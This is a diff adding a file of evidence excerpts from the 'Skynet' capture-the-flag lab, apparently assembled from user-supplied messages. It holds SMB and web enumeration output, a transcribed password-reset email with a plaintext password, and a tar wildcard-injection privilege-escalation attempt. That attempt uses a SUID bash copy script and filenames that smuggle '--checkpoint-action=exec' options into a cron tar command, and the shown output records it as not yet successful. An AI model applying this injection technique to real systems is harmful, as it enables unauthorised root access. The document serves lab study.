@@ -1,0 +1,52 @@
+SKYNET — supplementary evidence excerpts
+Source: user-provided chat messages (not independent raw command exports)
+Compiled: 2026-10-10
+
+[A] MAIN RECON OUTPUT (submitted separately as conversation text)
+Target 10.80.151.179; AttackBox 10.80.99.50
+smbclient -L //10.80.151.179 -N
+  print$ / anonymous / milesdyson / IPC$
+Gobuster root paths: /admin (301), /config (301), /squirrelmail (301), /index.html (200), /server-status (403).
+Anonymous SMB share: attention.txt (163 bytes) and logs directory.
+
+[B] SAMBA PASSWORD RESET — USER-TRANSCRIBED MESSAGE
+Subject: Samba Password reset
+From: skynet@skynet
+Date: Tue, September 17, 2019 10:10 pm
+We have changed your smb password after system malfunction.
+Password: )s{A&2Z=F^n_E.B`
+
+[C] SEPARATE SQUIRRELMAIL MESSAGES
+Two messages from serenakogan@skynet appeared in the authenticated inbox; one showed a binary-encoded repetitive text. They were not required for the attack chain.
+
+[D] TARGET SHELL — EXACT OBSERVATIONS FROM USER MESSAGE
+www-data@skynet:/home/milesdyson$ cat /home/milesdyson/backups/backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+
+www-data@skynet:/home/milesdyson$ ls -ld /var/www/html
+drwxr-xr-x 8 www-data www-data 4096 Nov 26 2020 /var/www/html
+www-data@skynet:/home/milesdyson$ test -w /var/www/html && echo "Writable"
+Writable
+
+www-data@skynet:/var/www/html$ cat privesc.sh
+#!/bin/sh
+cp /bin/bash /tmp/skynetroot
+chmod 4755 /tmp/skynetroot
+
+www-data@skynet:/var/www/html$ ls -la -- | grep checkpoint
+-rw-r--r-- 1 www-data www-data     0 Oct 10 10:47 --checkpoint-action=exec=sh privesc.sh
+-rw-r--r-- 1 www-data www-data     0 Oct 10 10:47 --checkpoint=1
+
+www-data@skynet:/var/www/html$ ls -l /tmp/skynetroot
+ls: cannot access '/tmp/skynetroot': No such file or directory
+
+www-data@skynet:/var/www/html$ /tmp/skynetroot -p
+bash: /tmp/skynetroot: No such file or directory
+
+[E] REMARKS ON PROVENANCE
+Screenshots of the webmail login and inbox were separately uploaded as PNG files.
+The Nmap output file was seen in directory listings, but its contents were not uploaded.
+The original important.txt bytes were not included, although its filename was present in the AttackBox directory listing.
+A complete output from 'cat /etc/crontab' and any successful root-shell output were not supplied.
